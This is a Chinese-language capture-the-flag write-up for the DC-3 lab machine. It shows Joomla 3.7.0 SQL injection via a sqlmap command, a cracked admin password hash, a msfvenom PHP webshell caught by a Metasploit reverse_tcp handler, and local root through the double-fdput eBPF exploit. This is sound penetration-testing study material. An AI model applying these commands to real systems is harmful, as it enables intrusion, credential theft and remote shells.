一、信息收集

老样子，侦察存活主机，这次吸取DC-2的教训，把全部端口的侦察一次

打开页面查看，有无遗漏信息

Welcome to DC-3.

This time, there is only one flag, one entry point and no clues.

To get the flag, you’ll obviously have to gain root privileges.

How you get to be root is up to you - and, obviously, the system.

Good luck - and I hope you enjoy this little challenge. :-)

看来只有一个flag，没有任何提示，只要能拿到root就行，那就先侦察网站的框架结构，使用CMSeek查看

发现是一个叫做Joomla的CMS，版本为3.7.0，还有一些公开的框架路径。访问路径时还发现存在文件读取(不过很鸡肋)，还存在后台登陆页面

二、渗透过程

上网查询有无相关漏洞记载，发现一个貌似可以利用的SQL注入漏洞CVE-2018-8045

影响版本：joomla版本3.5.0 ~ 3.8.5，但是这个漏洞需后台登录成功后才可使用，那么这里就展开了两条思路，要么使用字典爆破，要么查找另外的角度。按正常逻辑来说，字典爆破为破不得已才使用，因为爆破会留下大量的访问痕迹。

接着找其他漏洞，很快查询到另外一个同样是SQL注入的漏洞CVE-2017-8917，恰好适用于版本3.7.0的Joomla—-CVE-2017-8917漏洞分析

既然知道存在SQL注入，那么Sqlmap就得上场了

sqlmap -u "192.168.8.131/?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(2,concat(0x7e,(database())),0)" -p list[fullordering] -f

得到数据库类型，版本，服务器等信息，接着就是表名、列名、字段内容了

用户名：admin

密码密文：$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu

使用John爆破密文可得密码snoopy

尝试在网站登陆，成功后查看内容，发现在模板内可上传文件或添加文件，使用msfvenom生成webshell文件

将msfshell.php上传到网页，在msf里使用exploit/multi/handler来接受shell

msfconsole -q

use exploit/multi/handler

set paylaod /php/meterpreter/reverse_tcp

set LHOST 192.168.8.132

run

再次访问上传的php文件，即可获得一个meterpreter的shell

先获取一个交互的shell，查看系统版本为Ubuntu16.04

查看网站的配置文件，得到数据库密码，看下能否通过UDF提权

检查数据库环境变量，看来UDF提权无望

原来kali里还自带一个查询漏洞库的功能，叫做searchsploit,学到了学到了

searchsploit Ubuntu 16.04，查询相关系统版本漏洞

这里看网上说使用double-fdput()漏洞即可，把POC下载下来，解压

tar -xvf exploit.tar

cd ebpf_mapfd_doubleput_exploit

./compile.sh

./doubleput

提权成功后，进入root即可查看flag

https://www.exploit-db.com/exploits/39772

三、总结

感觉这次靶机之旅没有上两次收获那么大，熟悉了一下sqlmap的操作，还知道kali自带的一个漏洞库和用msfvenom生成一个webshell,在msf连接等，提权的原理没搞懂，只会单纯拿着poc去提权，果然我还是太菜了。
